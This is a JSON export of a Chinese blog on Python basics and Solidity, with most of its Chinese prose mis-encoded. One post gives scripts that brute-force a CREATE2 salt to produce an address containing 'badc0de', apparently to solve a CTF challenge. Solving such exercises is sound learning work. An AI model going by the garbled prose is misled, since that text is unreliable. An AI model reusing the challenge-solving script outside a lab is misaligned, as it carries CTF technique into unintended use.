{"meta":{"title":"ç¬”å‹ğŸ‰ã®çŸ¥è¯†åº“","subtitle":"","description":"Self-Discipline","author":"ç¬”å‹ğŸ‰","url":"https://biyouqiuqiu.com","root":"/"},"pages":[{"title":"","date":"2023-05-31T23:45:14.074Z","updated":"2023-05-31T23:45:14.074Z","comments":true,"path":"about/index.html","permalink":"https://biyouqiuqiu.com/about/index.html","excerpt":"","text":""},{"title":"æˆ‘çš„æœ‹å‹ä»¬","date":"2023-05-31T23:46:33.843Z","updated":"2023-05-31T23:46:33.843Z","comments":true,"path":"friends/index.html","permalink":"https://biyouqiuqiu.com/friends/index.html","excerpt":"è¿™é‡Œå†™å‹é“¾ä¸Šæ–¹çš„å†…å®¹ã€‚","text":"è¿™é‡Œå†™å‹é“¾ä¸Šæ–¹çš„å†…å®¹ã€‚ è¿™é‡Œå¯ä»¥å†™å‹é“¾é¡µé¢ä¸‹æ–¹çš„æ–‡å­—å¤‡æ³¨ï¼Œä¾‹å¦‚è‡ªå·±çš„å‹é“¾è§„èŒƒã€ç¤ºä¾‹ç­‰ã€‚"},{"title":"æ‰€æœ‰åˆ†ç±»","date":"2023-05-31T23:45:51.441Z","updated":"2023-05-31T23:45:51.441Z","comments":true,"path":"categories/index.html","permalink":"https://biyouqiuqiu.com/categories/index.html","excerpt":"","text":""},{"title":"Good article recommended","date":"2023-04-07T00:59:10.000Z","updated":"2023-04-07T00:59:10.000Z","comments":true,"path":"collectings/Good article recommended.html","permalink":"https://biyouqiuqiu.com/collectings/Good%20article%20recommended.html","excerpt":"","text":"Good article recommended1. å…³äº EVMçš„å­˜å‚¨ï¼Œstorage å’Œ slotï¼šhttps://learnblockchain.cn/article/42662. ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ä¸­éšæœºæ•°é¢„æµ‹: https://www.freebuf.com/vuls/179173.html3. æœ‰å…³æ•°ç»„åœ¨å†…å­˜çš„å‚¨å­˜ ï¼šhttps://learnblockchain.cn/article/45744. ä¸åŠ¨æ€æ•°ç»„å­˜å‚¨ã€ç»“æ„ä½“ç›¸å…³ä¸”æ±‚æ•°ç»„çš„å­˜å‚¨ä½ç½®çš„ï¼šhttps://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/ 5. ä¸€ä¸ªæ™ºèƒ½åˆçº¦å¯ä»¥å­˜å‚¨256bitçš„keyï¼ˆ2 ^ 256ä¸ªkeyï¼‰ï¼Œæ¯ä¸ªkeyå¯ä»¥å­˜å‚¨256bitçš„valueï¼Œå³2^261bytes çš„æ•°æ®6. ä»¥å¤ªåŠä¸­çš„ç­¾åå’Œè®¤è¯7. ä»¥å¤ªåŠï¼šè´¦æˆ·äº¤æ˜“è¿‡ç¨‹åˆ†æ"},{"title":"éšç¬”","date":"2023-06-02T02:19:31.985Z","updated":"2023-06-02T02:19:31.985Z","comments":true,"path":"informal essay/index.html","permalink":"https://biyouqiuqiu.com/informal%20essay/index.html","excerpt":"","text":""},{"title":"æ‰€æœ‰æ ‡ç­¾","date":"2023-06-01T04:44:20.604Z","updated":"2023-06-01T04:44:20.604Z","comments":true,"path":"tags/index.html","permalink":"https://biyouqiuqiu.com/tags/index.html","excerpt":"","text":""},{"title":"good_articles","date":"2023-06-02T02:50:09.608Z","updated":"2023-06-02T02:50:09.608Z","comments":true,"path":"collectings/index.html","permalink":"https://biyouqiuqiu.com/collectings/index.html","excerpt":"","text":""}],"posts":[{"title":"pythonç½‘è¯¾ç¬”è®°","slug":"Python/Basic_Knowledge/pythonç½‘è¯¾ç¬”è®°","date":"2023-06-02T16:18:01.000Z","updated":"2023-06-02T16:18:01.000Z","comments":true,"path":"2023/06/03/Python/Basic_Knowledge/pythonç½‘è¯¾ç¬”è®°/","link":"","permalink":"https://biyouqiuqiu.com/2023/06/03/Python/Basic_Knowledge/python%E7%BD%91%E8%AF%BE%E7%AC%94%E8%AE%B0/","excerpt":"","text":"Bç«™pythonè§†é¢‘é“¾æ¥day011. open()å‡½æ•°åœ¨ Python ä¸­ï¼Œopen() å‡½æ•°å¯ä»¥ç”¨æ¥æ‰“å¼€æ–‡ä»¶å¹¶æ“ä½œæ–‡ä»¶ã€‚ open() å‡½æ•°çš„è¯­æ³•å¦‚ä¸‹ï¼š 1open(file, mode=&#x27;r&#x27;, buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None) å…¶ä¸­ï¼Œå‚æ•°ï¼š fileï¼šè¦æ‰“å¼€çš„æ–‡ä»¶åï¼ˆåŒ…æ‹¬æ–‡ä»¶è·¯å¾„ï¼‰ã€‚ modeï¼šæ‰“å¼€æ–‡ä»¶çš„æ¨¡å¼ï¼Œé»˜è®¤ä¸ºåªè¯»æ¨¡å¼ &#39;r&#39;ï¼Œè¿˜å¯é€‰å†™å…¥æ¨¡å¼ &#39;w&#39;ï¼Œè¿½åŠ æ¨¡å¼ &#39;a&#39;ï¼ŒäºŒè¿›åˆ¶æ¨¡å¼ &#39;b&#39; å’Œè¯»å†™æ¨¡å¼ &#39;+&#39; ç­‰ã€‚ bufferingï¼šç¼“å†²ç­–ç•¥ï¼Œ0 è¡¨ç¤ºä¸ç¼“å†²ï¼Œ1 è¡¨ç¤ºç¼“å†²ä¸€è¡Œï¼Œå¤§äº 1 è¡¨ç¤ºç¼“å†²åŒºå¤§å°ï¼ˆå•ä½ä¸ºå­—èŠ‚ï¼‰ã€‚ encodingï¼šæŒ‡å®šæ–‡ä»¶ç¼–ç æ–¹å¼ï¼Œé»˜è®¤ä¸º Noneï¼Œå³ä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„ç¼–ç æ–¹å¼ã€‚ errorsï¼šæŒ‡å®šç¼–è§£ç é”™è¯¯å¤„ç†æ–¹æ¡ˆï¼Œé»˜è®¤ä¸º &#39;strict&#39;ï¼Œå³é‡åˆ°é”™è¯¯ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ newlineï¼šæŒ‡å®šå†™å…¥æ–‡ä»¶æ—¶ä½¿ç”¨çš„æ¢è¡Œç¬¦ï¼Œå¯é€‰å€¼æœ‰ Noneã€&#39;&#39;ã€&#39;\\n&#39;ã€&#39;\\r&#39; å’Œ &#39;\\r\\n&#39;ã€‚ closefdï¼šå½“ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦æ—¶ï¼Œå¦‚æœå€¼ä¸º Falseï¼Œåˆ™ä¸å…³é—­åº•å±‚æ–‡ä»¶æè¿°ç¬¦ã€‚ openerï¼šä¸€ä¸ªå¯é€‰çš„è‡ªå®šä¹‰æ‰“å¼€å™¨ï¼Œç”¨äºé€šè¿‡è‡ªå®šä¹‰æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚ æ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼Œå°†åœ¨E:/ä¸‹ç”Ÿæˆä¸€ä¸ªtemp.txtæ–‡ä»¶ 12345# open() å‡½æ•°# a+è¡¨ç¤ºæ–‡ä»¶å¤¹ä¸å­˜åœ¨å°±æ–°å»ºï¼Œå­˜åœ¨çš„è¯å°±è¿½åŠ å†…å®¹fp = open(&quot;E:/temp.txt&quot;,&quot;a+&quot;,encoding=&quot;UTF-8&quot;)print(&quot;ç¬¬ä¸€æ¬¡ä½¿ç”¨openå‡½æ•°&quot;,file=fp)fp.close 2. åŸå­—ç¬¦ â€” ä½¿è½¬ä¹‰å­—ç¬¦ä¸ç”Ÿæ•ˆä¸å¸Œæœ›å­—ç¬¦ä¸²ä¸­çš„è½¬ä¹‰å­—ç¬¦èµ·ä½œç”¨ï¼Œå°±ä½¿ç”¨åŸå­—ç¬¦ â€” ä½¿ç”¨æ–¹æ³•ï¼šåœ¨å­—ç¬¦ä¸²å‰åŠ ä¸Šræˆ–R 3. æ•°æ®ç±»å‹3.1 æ•´æ•°ç±»å‹æœ‰å…³è¿›åˆ¶çš„pyhtonä¸­çš„è¡¨ç° 3. 2 æµ®ç‚¹ç±»å‹ 3.3 æµ®ç‚¹ç±»å‹ 3.4 å­—ç¬¦ä¸²ç±»å‹ 4. æ•°æ®ç±»å‹è½¬æ¢ 4.1 intç±»å‹è½¬strç±»å‹ è§£å†³åŠæ³•ï¼š 1print(&#x27;æˆ‘å«&#x27;+name+&#x27;,ä»Šå¹´&#x27;+str(age)+&#x27;å²&#x27;) #å°†intç±»å‹çš„ageè½¬æˆå­—ç¬¦ä¸²ç±»å‹ 4.2 å…¶ä»–ç±»å‹è½¬æˆstrç±»å‹ 4.3 int()å°†å…¶ä»–ç±»å‹è½¬ä¸ºintç±»å‹æ³¨ï¼šint()ä¸èƒ½è½¬å°æ•°ä¸²æˆ–è€…æ–‡å­—ä¸² 4.4 float() å°†å…¶ä»–ç±»å‹è½¬ä¸ºfloatç±»å‹æ³¨ï¼šfloat()ä¸èƒ½è½¬æ–‡å­—ä¸² 5.pythonä¸­çš„æ³¨é‡Š 6. inputh()å‡½æ•°æ³¨ï¼šinput()å‡½æ•°è¾“å…¥çš„ç»“æœæ˜¯å­—ç¬¦ä¸²ç±»å‹ 7.è¿ç®—ç¬¦ 7.1 åŸºæœ¬ç®—æœ¯è¿ç®—è¯­è¨€çš„è¿ç®—ç¬¦çš„ä½¿ç”¨æ–¹å¼å¤§å·®ä¸å·®ï¼Œpythonä¸­è¦æ³¨æ„çš„æ˜¯ï¼š 123print(1/2)#ç»“æœæ˜¯0.5ï¼ŒåŒºåˆ«äºjava(å…·ä½“çœ‹å¦‚ä½•å®šä¹‰çš„å§ï¼Œå¦‚æœ1å®šä¹‰ä¸ºintç±»å‹ï¼Œåˆ™ç»“æœæ˜¯0)print(11//2) #ç»“æœæ˜¯5ï¼Œ`//`è¡¨ç¤ºæ•´é™¤print(2**3) #ç»“æœæ˜¯8ï¼Œè¡¨ç¤º2çš„3æ¬¡æ–¹ 7.2 å¤æ‚ç®—æ•°è¿ç®—ï¼ˆæ¶‰åŠæ­£è´Ÿæ•°è¿ç®—ï¼‰æ•´é™¤ //:éœ€è¦å‘ä¸‹å–æ•´ æ±‚ä½™%: å…¬å¼ &#x3D;&gt; ä½™æ•°=è¢«é™¤æ•°-é™¤æ•°*å•† 7.3 èµ‹å€¼è¿ç®—ç¬¦æ³¨ï¼šè¿ç®—é¡ºåºä»å³åˆ°å·¦ 7.4 æ¯”è¾ƒè¿ç®—ç¬¦ æ³¨ï¼šæ¯”è¾ƒè¿ç®—ç¬¦çš„ç»“æœæ˜¯boolç±»å‹ 7.5 å¸ƒå°”è¿ç®— 7.6 ä½è¿ç®—ç¬¦ 8.id()çš„ä½¿ç”¨ åœ¨Pythonä¸­ï¼Œå¯¹äºä¸€äº›ç®€å•çš„å¯¹è±¡ç±»å‹ï¼ˆå¦‚æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¸ƒå°”å€¼ç­‰ï¼‰ï¼Œå¦‚æœå®ƒä»¬çš„å€¼ç›¸åŒï¼Œé‚£ä¹ˆå®ƒä»¬çš„idä¹Ÿç›¸åŒã€‚è¿™æ˜¯å› ä¸ºPythonä¸­å¯¹è¿™äº›å¯¹è±¡ç±»å‹è¿›è¡Œäº†ä¼˜åŒ–ï¼Œå°†æŸäº›å¸¸ç”¨çš„å¯¹è±¡ç¼“å­˜èµ·æ¥ï¼Œä½¿å¾—åœ¨ç¨‹åºä¸­å¤šæ¬¡ä½¿ç”¨ç›¸åŒçš„å€¼æ—¶ï¼Œå®ƒä»¬çš„idæ˜¯ç›¸åŒçš„ã€‚ ä¾‹å¦‚ï¼Œå¯¹äºæ•´æ•°å¯¹è±¡ï¼ŒPythonå°†[-5, 256]èŒƒå›´å†…çš„æ•´æ•°ç¼“å­˜èµ·æ¥ï¼Œå› æ­¤å¦‚æœä¸¤ä¸ªæ•´æ•°å˜é‡çš„å€¼åœ¨è¿™ä¸ªèŒƒå›´å†…ä¸”ç›¸åŒï¼Œå®ƒä»¬çš„idå°±ç›¸åŒã€‚ ç¤ºä¾‹ä»£ç ï¼š 1234a = 10b = 10print(id(a)) # è¾“å‡ºï¼š140735263730704print(id(b)) # è¾“å‡ºï¼š140735263730704 ä½†å¯¹äºå…¶ä»–å¯¹è±¡ç±»å‹ï¼ˆå¦‚åˆ—è¡¨ã€å…ƒç»„ã€å­—å…¸ç­‰ï¼‰ï¼Œå¦‚æœå®ƒä»¬çš„å€¼ç›¸åŒï¼Œå®ƒä»¬çš„idä¸ä¸€å®šç›¸åŒï¼Œå› ä¸ºå®ƒä»¬æ˜¯ä¸åŒçš„å¯¹è±¡ã€‚ ç¤ºä¾‹ä»£ç ï¼š 1234a = [1, 2, 3]b = [1, 2, 3]print(id(a)) # è¾“å‡ºï¼š140735263499528print(id(b)) # è¾“å‡ºï¼š140735263501256 testï¼š","categories":[{"name":"Python","slug":"Python","permalink":"https://biyouqiuqiu.com/categories/Python/"},{"name":"Basic_Knowledge","slug":"Python/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Python/Basic-Knowledge/"}],"tags":[{"name":"python","slug":"python","permalink":"https://biyouqiuqiu.com/tags/python/"}]},{"title":"calAddressByCreate2","slug":"Solidity/Basic_Knowledge/calAddressByCreate2","date":"2023-05-25T15:10:10.000Z","updated":"2023-05-25T15:10:10.000Z","comments":true,"path":"2023/05/25/Solidity/Basic_Knowledge/calAddressByCreate2/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/25/Solidity/Basic_Knowledge/calAddressByCreate2/","excerpt":"","text":"calAddressByCreate21. ã€ä½¿ç”¨pythonã€‘è¿™é‡Œæ˜¯å€Ÿé‰´å¼ å­¦é•¿çš„ğŸ¤£ 1.1 å®‰è£…web3åº“1pip install web3 1.2 è®¡ç®—ä»£ç 12345678910111213141516171819202122232425262728from web3 import Web3# value of your address(this) # must delet 0x# exampleï¼š0x5B38Da6a701c568545dCfcB03FcB875f56beddC4address = &quot;5B38Da6a701c568545dCfcB03FcB875f56beddC4&quot;# å›ºå®šå¸¸é‡ 0xffconst_value = &quot;0xff&quot;# å°†å‰ä¸¤ä¸ªå€¼æ‹¼æ¥èµ·æ¥s1 = const_value + address# è¿™ä¸ªä¸ºä»£éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç ï¼Œå¯ä»¥é€šè¿‡keccak256(abi.encodePacked(bytecode))æ¥è®¡ç®—s3 = &#x27;&#x27;i = 0while(True): salt = hex(i)[2:].rjust(64, &#x27;0&#x27;) s = s1+salt+s3 hashed = Web3.keccak(hexstr=s) hashed_str = &#x27;&#x27;.join([&#x27;%02x&#x27; % b for b in hashed]) if &#x27;badc0de&#x27; in hashed_str[24:]: print(salt,hashed_str) break i += 1 print(hashed) pythonæš‚æ—¶æ²¡å­¦å¥½ï¼Œç­‰è¿‡æ®µæ—¶é—´å†å›æ¥è§£è¯» 2.ã€ä½¿ç”¨ethereumjsã€‘2.1 å®‰è£…ethereumjsåº“1npm install ethereumjs-util 2.2 è®¡ç®—ä»£ç bytecodeçš„å€¼å‰è¦å¡« 0x 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758const eth = require(&#x27;ethereumjs-util&#x27;);// a. å¸¸æ•°const const_num = &quot;0xFF&quot;;// b. åˆ›å»ºè€…åœ°å€ï¼ˆåˆçº¦åœ°å€ï¼‰// ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ï¼š address(this)// æ‹¼æ¥çš„æ—¶å€™ä¸èƒ½åŒ…å« `0x`const contract_add = &quot;0xf2B1114C644cBb3fF63Bf1dD284c8Cd716e95BE9&quot;;// 3. æ‹¼æ¥ const str1 = const_num + contract_add.slice(2,contract_add.length);// 4. ä»£éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç çš„hashå€¼ const bytecode = &quot;0x608060405234801561000f575f80fd5b506103478061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063380c7a6714610038578063b2fa1c9e14610042575b5f80fd5b610040610060565b005b61004a61009d565b6040516100579190610219565b60405180910390f35b610069336100ad565b610071575f80fd5b61007a33610144565b610082575f80fd5b60015f806101000a81548160ff021916908315150217905550565b5f8054906101000a900460ff1681565b5f7f736d6172780000000000000000000000000000000000000000000000000000008273ffffffffffffffffffffffffffffffffffffffff166306fdde036040518163ffffffff1660e01b8152600401602060405180830381865afa158015610118573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013c9190610269565b149050919050565b5f808260601b90505f6f0badc0de00000000000000000000000090505f6f0fffffff00000000000000000000000090505f5b60228110156101f257826bffffffffffffffffffffffff19168285166bffffffffffffffffffffffff1916036101b35760019450505050506101fa565b6004826bffffffffffffffffffffffff1916901b91506004836bffffffffffffffffffffffff1916901b925080806101ea906102ca565b915050610176565b505f93505050505b919050565b5f8115159050919050565b610213816101ff565b82525050565b5f60208201905061022c5f83018461020a565b92915050565b5f80fd5b5f819050919050565b61024881610236565b8114610252575f80fd5b50565b5f815190506102638161023f565b92915050565b5f6020828403121561027e5761027d610232565b5b5f61028b84828501610255565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6102d4826102c1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361030657610305610294565b5b60018201905091905056fea26469706673582212206e6c1e4a56c3130f88f4149292cceaff6d90339aeaa3f29562e40adef7c39b2a64736f6c63430008140033&quot;;let bytecodeToHash = eth.bufferToHex(eth.keccakFromHexString(bytecode));// å»æ‰0xbytecodeToHash = bytecodeToHash.slice(2, bytecodeToHash.length);let salt = 0;while (true) &#123; // 1. Convert i to hex, and it pad to 32 bytes: // 1. å°†iè½¬ä¸º16è¿›åˆ¶çš„å­—ç¬¦ä¸²ï¼ŒpadStartå³å¯¹é½ï¼Œç”¨ 0 è¡¥é½32bytes // var saltToBytes = salt.toString(16).padStart(64, &#x27;0&#x27;); let saltToHex = &quot;0x&quot; + salt.toString(16); let saltToHash = eth.bufferToHex(eth.keccakFromHexString(saltToHex)); saltToHash = saltToHash.slice(2, saltToHash.length); // 2. Concatenate this between the other 2 strings // 2. å°† string1 saltToBytes string2ä¸‰ä¸ªå­—æ®µçš„å€¼æ‹¼æ¥åœ¨ä¸€èµ· var concatString = str1.concat(saltToHash).concat(bytecodeToHash); /** * 3. Hash the resulting string * å¯¹ä¸Šè¡Œä»£ç çš„ concatString è¿›è¡Œhashï¼š * eth.keccakFromHexString() æ˜¯ Ethereum.js åº“ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œ * ç”¨äºå¯¹ä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²è¿›è¡Œ Keccak-256 å“ˆå¸Œè¿ç®—è¿”å›å€¼ç±»å‹ä¸º Buffer * */ var hashed = eth.bufferToHex(eth.keccakFromHexString(concatString)); // è¿™ä¸ªä¸å¯¹ å› ä¸º eth.keccak256()çš„å‚æ•°ä¸æ”¯æŒstringç±»å‹ï¼Œåªæ”¯æŒBufferç±»å‹ // var hashed = eth.bufferToHex(eth.keccak256(concatString)) // 4. Remove leading 0x and 12 bytes // 5. Check if the result contains badc0de // hashed.slice(26,20) if (hashed.slice(26, hashed.length).includes(&#x27;badc0de&#x27;)) &#123; console.log(`salt = 0x$&#123;salt.toString(16)&#125;`); console.log(`address = 0x$&#123;hashed.slice(26, hashed.length)&#125;`); break; &#125; salt++;&#125; 3. ã€ethersjsã€‘3. 1 å®‰è£…ethersjsåº“1npm install ethers 3.2 è®¡ç®—ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import &#123; ethers &#125; from &quot;ethers&quot;/** * create2 è®¡ç®—åˆçº¦åœ°å€æ‰€éœ€è¦çš„å››ä¸ªå€¼ * * 1. 0xFFï¼šä¸€ä¸ªå¸¸æ•°ï¼Œé¿å…å’ŒCREATEå†²çª 2. åˆ›å»ºè€…åœ°å€ 3. saltï¼ˆç›ï¼‰ï¼šä¸€ä¸ªåˆ›å»ºè€…ç»™å®šçš„æ•°å€¼ 4. å¾…éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç ï¼ˆbytecodeï¼‰ */// 1. å¸¸æ•°const const_num = &quot;0xFF&quot;;// 2. åˆ›å»ºè€…åœ°å€ï¼ˆåˆçº¦åœ°å€ï¼‰// ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ï¼š address(this)// æ‹¼æ¥çš„æ—¶å€™ä¸èƒ½åŒ…å« `0x`const contract_add = &quot;0xf2B1114C644cBb3fF63Bf1dD284c8Cd716e95BE9&quot;;// 3. æ‹¼æ¥ let str1 = const_num + contract_add.slice(2,contract_add.length);// 4. ä»£éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç çš„hashå€¼const bytecode = &quot;0x608060405234801561000f575f80fd5b506103478061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063380c7a6714610038578063b2fa1c9e14610042575b5f80fd5b610040610060565b005b61004a61009d565b6040516100579190610219565b60405180910390f35b610069336100ad565b610071575f80fd5b61007a33610144565b610082575f80fd5b60015f806101000a81548160ff021916908315150217905550565b5f8054906101000a900460ff1681565b5f7f736d6172780000000000000000000000000000000000000000000000000000008273ffffffffffffffffffffffffffffffffffffffff166306fdde036040518163ffffffff1660e01b8152600401602060405180830381865afa158015610118573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013c9190610269565b149050919050565b5f808260601b90505f6f0badc0de00000000000000000000000090505f6f0fffffff00000000000000000000000090505f5b60228110156101f257826bffffffffffffffffffffffff19168285166bffffffffffffffffffffffff1916036101b35760019450505050506101fa565b6004826bffffffffffffffffffffffff1916901b91506004836bffffffffffffffffffffffff1916901b925080806101ea906102ca565b915050610176565b505f93505050505b919050565b5f8115159050919050565b610213816101ff565b82525050565b5f60208201905061022c5f83018461020a565b92915050565b5f80fd5b5f819050919050565b61024881610236565b8114610252575f80fd5b50565b5f815190506102638161023f565b92915050565b5f6020828403121561027e5761027d610232565b5b5f61028b84828501610255565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6102d4826102c1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361030657610305610294565b5b60018201905091905056fea26469706673582212206e6c1e4a56c3130f88f4149292cceaff6d90339aeaa3f29562e40adef7c39b2a64736f6c63430008140033&quot;;// 5.1 å¯¹bytecode è¿›è¡Œhashè¿ç®— è¿™ä¸ªåªèƒ½ç”¨å•å¼•å·// solidityKeccak256([&#x27;bytes&#x27;],[bytecode]) &lt;=&gt; keccak256(abi.encodePacked(bytecode))const bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);// 5.2 ä¸‹é¢è¿™è¡Œä»£ç ä¹Ÿè¡Œï¼Œå› ä¸ºå¯¹ bytecodeè¿›è¡Œç´§æ‰“åŒ…çš„ç»“æœä¸å˜// const bytecodeToHash = ethers.utils.keccak256(bytecode);// console.log(bytecodeToHash)// 5. å®šä¹‰ä¸€ä¸ªç›ï¼Œä»¥åŠä¸€ä¸ªæ‰€æ±‚å­—æ®µlet salt = 0;const value = &quot;badc0de&quot;; // CTFé¶åœºçš„é¢˜// éå†å‡ºæŒ‡å®šå€¼ï¼Œæ±‚å‡ºsaltwhile (true) &#123; // å°†saltè½¬ä¸º16è¿›åˆ¶ï¼Œç”¨0å¡«å……ä¸º64ä½ // let saltToBytes = salt.toString(16).padStart(64, 0).toString(); let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length); // å†æ¬¡æ‹¼æ¥ é¡ºåºï¼š å¸¸æ•° åˆ›å»ºè€…åœ°å€ ç› å­—èŠ‚ç çš„hashå€¼ // bytecodeToHash.slice(2,bytecodeToHash.length): åˆ é™¤ `0x` let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); // å¯¹ str2 è¿›è¡Œhash let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); // console.log(saltBuffer) // å…ˆå°†æ‰“åŒ…å¥½çš„str2 è½¬ä¸º utf8çš„å­—èŠ‚æ•°ç»„ // let saltUtf8Bytes = ethers.utils.toUtf8Bytes(str2); // å°† saltUtf8Bytes è½¬åŒ–ä¸ºbuffer // let saltBuffer = ethers.utils.arrayify(saltUtf8Bytes); // å¯¹ saltBuffer è¿›è¡Œhash // let hash = ethers.utils.keccak256(str2); //åˆ¤æ–­ æ˜¯å¦æ»¡è¶³æ¡ä»¶ if (hash.slice(26, hash.length).includes(value)) &#123; console.log(`salt = 0x$&#123;salt.toString(16)&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; æ­é…ä½¿ç”¨çš„solidityä»£ç  è®¡ç®—åœ°å€ï¼š 1234567891011 function getCreate2Address(address addToDeploy, uint256 salt, bytes memory bycode) external pure returns(address result) &#123; result = address(uint160(uint( keccak256(abi.encodePacked( uint8(0xff), // å›ºå®šçš„ä¸€ä¸ªå­—èŠ‚çš„å¸¸æ•° 0xff addToDeploy, //å½“å‰åˆçº¦åœ°å€ï¼ˆcreate2åˆçº¦åœ°å€ï¼‰ keccak256(abi.encodePacked(salt)), //å¯¹ç›è¿›è¡Œç´§æ‰“åŒ… keccak256(bycode) //è¦è®¡ç®—çš„åˆçº¦çš„å­—èŠ‚ç  )) ))); &#125;&#125; 4. æ¨èä½¿ç”¨ ethersjs","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"}]},{"title":"encode && encodePacked","slug":"Solidity/Basic_Knowledge/abi.encode&&abi.encodePacked","date":"2023-05-24T08:10:10.000Z","updated":"2023-05-24T08:10:10.000Z","comments":true,"path":"2023/05/24/Solidity/Basic_Knowledge/abi.encode&&abi.encodePacked/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/24/Solidity/Basic_Knowledge/abi.encode&&abi.encodePacked/","excerpt":"","text":"abi.encode å’Œ abi.encodePackedçš„åŒºåˆ«abiç¼–ç çš„è¯¦è§£ ç§»æ­¥&#x3D;&#x3D;&#x3D;ã€‹1.abi.encode abi.encode å°†å®ƒçš„æ¯ä¸ªå‚æ•°å¡«å……ä¸º32å­—èŠ‚ã€32 * 8 &#x3D;256ä½ã€‘ï¼ˆ1byte &#x3D; 8bitï¼‰çš„æ•°æ®ï¼Œå¹¶æ‹¼æ¥åœ¨ä¸€èµ·ã€‚ æ³¨ï¼šå¦‚æœè¦å’Œåˆçº¦äº¤äº’ï¼Œä½¿ç”¨çš„æ˜¯abi.encodeï¼ˆå®è·µæ“ä½œï¼‰ 1.1 abi.encodeç¼–ç æ¼”ç¤ºå®šä¹‰çš„å˜é‡ï¼š 12345uint8 num1 = 1;uint256 num2 = 1;address _addr = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;string name = &quot;biyou&quot;;bytes1 bs1 = 0xff; ä»£ç 1ï¼š num1æ˜¯uint8ç±»å‹ï¼Œå ç”¨1ä¸ªå­—èŠ‚ 123function testABIEncode1() external view returns(bytes memory reslut) &#123; reslut = abi.encode(num1, _addr, name, bs1); &#125; ä»£ç 2ï¼š num2æ˜¯uint256ç±»å‹ï¼Œå ç”¨32ä¸ªå­—èŠ‚ 123function testABIEncode2() external view returns(bytes memory reslut) &#123; reslut = abi.encode(num2, _addr, name, bs1);&#125; çœ‹è¿è¡Œç»“æœï¼š ç”±è¿è¡Œç»“æœ æ¯”è¾ƒnum1 å’Œnum2çš„ç¼–ç å€¼å¯çŸ¥ï¼Œä¸ç®¡å‚æ•°çš„æ•°æ®ç±»å‹æ˜¯ä»€ä¹ˆï¼Œå®ƒéƒ½å°†å‚æ•°å¡«å……ä¸º32ä½ã€‚æ‰€ä»¥è¿™ä¸¤ä¸ªå‡½æ•°çš„ç¼–ç ç»“æœç›¸åŒã€‚ 1.2 abi.encode ä¸åˆçº¦äº¤äº’ â€”- ä»¥create2ä¸ºä¾‹create2 çš„ä½¿ç”¨è¯·ç§»æ­¥ &#x3D;&#x3D;&#x3D;ã€‹ ã€abi.encodeã€‘é€šè¿‡ abi.encodeå¯¹è¦éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç å’Œä»£ä¼ å‚æ•°ï¼ˆid &#x3D; 1, name &#x3D; â€œbiyouâ€ï¼‰è¿›è¡Œâ€œéç´§â€æ‰“åŒ…ï¼š 123456// éç´§æ‰“åŒ… -- æ¶‰åŠäº†åˆçº¦æ„é€ å‡½æ•°çš„å‚æ•° function encodeBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // å°†å­—èŠ‚ç å’Œå‚æ•°è¿›è¡Œç´§æ‰“åŒ… result = abi.encodePacked(temp, abi.encode(id,name));&#125; è¿è¡Œç»“æœçš„éƒ¨åˆ†æˆªå›¾ï¼š å°†è·å–çš„bytecodeçš„å€¼ï¼Œæ”¾å…¥create2Addresså‡½æ•°ä¸­,ä¼ å…¥ç›saltï¼ˆbiyouï¼‰ï¼Œè®¡ç®— Studentåˆçº¦çš„åœ°å€ create2Addresså‡½æ•°ä»£ç ï¼š 123456789101112131415function create2Address(bytes memory bycode,string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // 